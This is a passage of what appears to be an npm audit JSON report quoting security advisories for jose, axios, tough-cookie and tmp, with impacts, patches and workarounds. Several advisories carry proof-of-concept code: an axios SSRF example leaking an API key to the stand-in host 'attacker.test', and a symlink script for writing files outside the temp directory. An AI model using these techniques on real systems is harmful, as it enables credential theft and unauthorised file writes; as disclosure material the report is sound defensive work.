This allows an adversary to exploit specific scenarios where the compression ratio becomes exceptionally high. As a result, the length of the JWE token, which is determined by the compressed content's size, can land below application-defined limits. In such cases, other existing application level mechanisms for preventing resource exhaustion may be rendered ineffective.\n\nNote that as per [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725.html#name-avoid-compression-of-encryp) compression of data SHOULD NOT be done before encryption, because such compressed data often reveals information about the plaintext. For this reason the v5.x major version of `jose` removed support for compressed payloads entirely and is therefore NOT affected by this advisory.\n\n### Impact\n\nUnder certain conditions it is possible to have the user's environment consume unreasonable amount of CPU time or memory during JWE Decryption operations.\n\n### Affected users\n\nThe impact is limited only to Node.js users utilizing the JWE decryption APIs to decrypt JWEs from untrusted sources.\n\nYou are NOT affected if any of the following applies to you\n\n- Your code uses jose version v5.x where JWE Compression is not supported anymore\n- Your code runs in an environment other than Node.js (e.g. Deno, CF Workers), which is the only runtime where JWE Compression is implemented out of the box\n- Your code does not use the JWE decryption APIs\n- Your code only accepts JWEs produced by trusted sources\n\n### Patches\n\n`v2.0.7` and `v4.15.5` releases limit the decompression routine to only allow decompressing up to 250 kB of plaintext. In v4.x it is possible to further adjust this limit via the `inflateRaw` decryption option implementation. In v2.x it is possible to further adjust this limit via the `inflateRawSyncLimit` decryption option.\n\n### Workarounds\n\nIf you cannot upgrade and do not want to support compressed JWEs you may detect and reject these tokens early by checking the token's protected header\n\n```js\nconst { zip } = jose.decodeProtectedHeader(token)\nif (zip !== undefined) {\n  throw new Error('JWE Compression is not supported')\n}\n```\n\nIf you wish to continue supporting JWEs with compressed payloads in these legacy release lines you must upgrade (v1.x and v2.x to version v2.0.7, v3.x and v4.x to version v4.15.5) and review the limits put forth by the patched releases.\n\n### For more information\nIf you have any questions or comments about this advisory please open a discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-hhhv-q57g-882q%20advisory%20question)","reported_by":null,"title":"jose vulnerable to resource exhaustion via specifically crafted JWE with compressed plaintext","metadata":null,"cves":["CVE-2024-28176"],"access":"public","severity":"moderate","module_name":"jose","vulnerable_versions":"<2.0.7","github_advisory_id":"GHSA-hhhv-q57g-882q","recommendation":"Upgrade to version 2.0.7 or later","patched_versions":">=2.0.7","updated":"2024-03-30T06:30:42.000Z","cvss":{"score":5.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},"cwe":["CWE-400"],"url":"https://github.com/advisories/GHSA-hhhv-q57g-882q"},"1097679":{"findings":[{"version":"0.26.1","paths":["axios","@hmcts/rpx-xui-node-lib>axios"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2023-45857\n- https://github.com/axios/axios/issues/6006\n- https://github.com/axios/axios/issues/6022\n- https://github.com/axios/axios/pull/6028\n- https://github.com/axios/axios/commit/96ee232bd3ee4de2e657333d4d2191cd389e14d0\n- https://github.com/axios/axios/releases/tag/v1.6.0\n- https://security.snyk.io/vuln/SNYK-JS-AXIOS-6032459\n- https://github.com/axios/axios/pull/6091\n- https://github.com/axios/axios/commit/2755df562b9c194fba6d8b609a383443f6a6e967\n- https://github.com/axios/axios/releases/tag/v0.28.0\n- https://security.netapp.com/advisory/ntap-20240621-0006\n- https://github.com/advisories/GHSA-wf5p-g6vw-rhxx","created":"2023-11-08T21:30:37.000Z","id":1097679,"npm_advisory_id":null,"overview":"An issue discovered in Axios 0.8.1 through 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.","reported_by":null,"title":"Axios Cross-Site Request Forgery Vulnerability","metadata":null,"cves":["CVE-2023-45857"],"access":"public","severity":"moderate","module_name":"axios","vulnerable_versions":">=0.8.1 <0.28.0","github_advisory_id":"GHSA-wf5p-g6vw-rhxx","recommendation":"Upgrade to version 0.28.0 or later","patched_versions":">=0.28.0","updated":"2024-06-21T21:33:58.000Z","cvss":{"score":6.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"},"cwe":["CWE-352"],"url":"https://github.com/advisories/GHSA-wf5p-g6vw-rhxx"},"1097682":{"findings":[{"version":"2.5.0","paths":["rx-polling-hmcts>jest-environment-jsdom>jsdom>tough-cookie"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2023-26136\n- https://github.com/salesforce/tough-cookie/issues/282\n- https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e\n- https://github.com/salesforce/tough-cookie/releases/tag/v4.1.3\n- https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873\n- https://lists.debian.org/debian-lts-announce/2023/07/msg00010.html\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3HUE6ZR5SL73KHL7XUPAOEL6SB7HUDT2\n- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PVVPNSAGSDS63HQ74PJ7MZ3MU5IYNVZ\n- https://security.netapp.com/advisory/ntap-20240621-0006\n- https://github.com/advisories/GHSA-72xf-g2v4-qvf3","created":"2023-07-01T06:30:16.000Z","id":1097682,"npm_advisory_id":null,"overview":"Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode.

Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.","reported_by":null,"title":"axios Requests Vulnerable To Possible SSRF and

temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via
